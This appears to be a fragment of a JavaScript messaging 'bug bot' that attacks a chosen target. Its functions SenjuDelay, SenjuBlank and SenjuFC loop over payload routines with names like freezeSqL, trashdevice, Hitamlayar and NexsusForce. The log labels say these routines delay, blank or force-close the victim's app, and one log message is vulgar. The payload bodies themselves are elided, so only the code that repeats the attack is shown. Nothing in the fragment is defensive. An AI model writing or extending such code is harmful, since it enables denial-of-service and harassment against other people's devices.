...
async function delay1(client, target, mention = false) {
    ...
    console.log('successfull sendding memek');
}
// END FUNCTION DELAY
...
async function SenjuDelay(client, target) {
  for (let i = 0; i < 20; i++) {
    try {
      console.log(`[DELAY] (${i+1}/20) InvisHard...`);
      await InvisHard(client, target);
      await delay(1000);
      console.log(`[DELAY] (${i+1}/20) Bulldozer...`);
      await bulldozer(client, target);
      await delay(1000);
      console.log(`[DELAY] (${i+1}/20) Delay1...`);
      await delay1(client, target);
      await delay(1000);
    } catch (err) {
      console.error(`[❌ SenjuDelay] Loop ${i+1} error:`, err.message);
    }
  }
}
...
async function SenjuBlank(client, target) {
  for (let i = 0; i < 5; i++) {
    try {
      console.log(`[BLANK] (${i+1}/5) FreezeSQL...`);
      await freezeSqL(client, target);
      console.log(`[BLANK] (${i+1}/5) TrashDevice...`);
      await trashdevice(client, target);
      console.log(`[BLANK] (${i+1}/5) BlankVisco...`);
      await BlankVisco(client, target);
      console.log(`[BLANK] (${i+1}/5) LocationX...`);
      await locationX(client, target);
      console.log(`[BLANK] (${i+1}/5) HitamLayar...`);
      await Hitamlayar(client, target);
    } catch (err) {
      console.error(`[❌ SenjuBlank] Loop ${i+1} error:`, err.message);
    }
  }
}
...
async function SenjuFC(client, target) {
  for (let i = 0; i < 20; i++) {
    try {
      console.log(`[FORCE CLOSE] (${i+1}/20) invisSqL...`);
      await invisSqL(client, target);
      console.log(`[FORCE CLOSE] (${i+1}/20) CrlSqL...`);
      await CrlSqL(client, target);
      console.log(`[FORCE CLOSE] (${i+1}/20) NexsusForce...`);
      await NexsusForce(client, target);
      console.log(`[FORCE CLOSE] (${i+1}/20) FloxCrl...`);
      await FloxCrl(client, target);
    } catch (err) {
      console.error(`[❌ SenjuFC] Loop ${i+1} error:`, err.message);
    }
  }
}
